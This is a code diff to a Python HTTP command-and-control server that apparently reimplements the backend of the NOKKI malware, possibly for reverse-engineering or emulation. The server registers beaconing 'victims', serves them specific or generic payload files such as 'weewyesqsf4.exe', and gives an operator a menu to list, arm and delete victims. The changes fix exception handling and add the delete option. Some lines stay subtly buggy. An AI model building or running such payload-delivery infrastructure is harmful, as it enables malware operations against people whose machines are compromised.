@@ -85,7 +85,7 @@ class NOKKIvictim:
         try:
             with open(NOKKIvictim.generic_filename, 'rb') as gen_file:
                 gen_data = gen_file.read()
-        except Exception():  # TODO: specify exception
+        except Exception:  # TODO: specify exception
             logging.error('Failed to return generic file data!')
             return b''
         else:
@@ -116,8 +116,6 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
                 raise Exception('Received Content-Length on GET request.')
                 # TODO: specify exception; used for debugging currently
 
-        # response_data = b''
-
         if req_path.endswith("/down"):  # Generic Upload to Request
             # victim writes response to weewyesqsf4.exe
             logging.info('Generic Upload Request')
@@ -133,13 +131,17 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
             victim = victim_list.get(victim_id)
             if victim:
                 victim.inc_get_count()
-
-            logging.info("victim_id: " + victim_id)
-            logging.info('Specific Upload Request')
-
-            # retrieves payload for specific victim request
-            response_data = victim_list[victim_id].ret_victim_file_data()
-
+                try:
+                    # retrieves payload for specific victim request
+                    logging.info('Specific download request from victim ID:', victim_id)
+                    response_data = victim_list[victim_id].ret_victim_file_data()
+                except KeyError as e:
+                    print('An error has been logged: failed to retrieve victim information.')
+                    logging.critical('KeyError while retrieving victim information: %s' % e)
+            else:
+                # give no binary data back
+                response_data = b''
+                logging.info('Beaconing victim does not exist: requiring POST request first.')
         else:
             raise Exception()  # TODO: better handle this exception; change to return nothing after some more RE
 
@@ -201,30 +203,32 @@ def main_menu():
     victim_list[vic.subject] = vic
 
     while menu_active:
-        print('----------------------------------------')
-        print(' (0) - List Victims')
-        print(' (1) - Add Specific Payload')
-        print(' (2) - Set Generic Payload')
-        print(' (3) - Delete Victims')
-        print(' (4) - Exit')
-        print('----------------------------------------')
-        try:
-            menu_option = int(input(':'))
-        except Exception():  # TODO: specify exception
-            break
+        print('============== MAIN MENU ==============')
+        print('| (0)        List Victims             |')
+        print('| (1)    Add Specific Payload         |')
+        print('| (2)    Set Generic Payload          |')
+        print('| (3)       Delete Victims            |')
+        print('| (4)            Exit                 |')
+        print('=======================================')
 
-        if menu_option == 0:  # LIST VICTIMS
-            print('Victims List')
+        try:
+            menu_option = int(input('?> '))
+        except ValueError:
+            print('Invalid input: try again.')
+
+        if menu_option == 0:
+            # LIST VICTIMS
+            print('------------- VICTIM LIST -------------')
             for key in victim_list:
                 print(victim_list[key].subject + " : " + victim_list[key].data)
         elif menu_option == 1:
-            print('Add Specific Payload')
+            # ADD SPECIFIC PAYLOAD
+            print('--------- ADD VICTIM PAYLOAD ----------')
             for key in victim_list:
                 print(key + ') ' + victim_list[key].subject + ' : ' + victim_list[key].data)
 
-            victim_key = ''
             while True:
-                victim_key = input('Specify the victim for the specific file download.')
+                victim_key = input('Specify the victim for the specific file download: ')
                 if victim_key in victim_list:
                     print('Selected %s.' % victim_key)
                     break
@@ -245,7 +249,8 @@ def main_menu():
                     print("Try another filename or type 'no' to cancel.")
 
         elif menu_option == 2:
-            print('Set Generic Payload')
+            # SET GENERIC PAYLOAD
+            print('--------- SET DEFAULT PAYLOAD ---------')
             while True:
                 generic_filename = input('Provide a filename for the generic file download: ')
                 if os.path.isfile(generic_filename):
@@ -258,9 +263,23 @@ def main_menu():
                     break
                 else:
                     print("Try another filename or type 'no' to cancel.")
-        elif menu_option == 2:
-            pass
+        elif menu_option == 3:
+            print('----------- DELETE A VICTIM -----------')
+            # DELETE VICTIMS
+            for key in victim_list:
+                print(key + ') ' + victim_list[key].subject + ' : ' + victim_list[key].data)
+
+            while True:
+                victim_key = input('Specify the victim ID for deletion: ')
+                if victim_key in victim_list:
+                    print('Removing %s...' % victim_key)
+                    victim_removed = victim_list.pop(victim_key)
+                    print('Removed %s.' % victim_removed.subject)
+                    break
+                else:
+                    print('That victim key does not exist.')
         elif menu_option == 4:
+            # EXIT
             print('Exiting!')
             menu_active = False
         else:
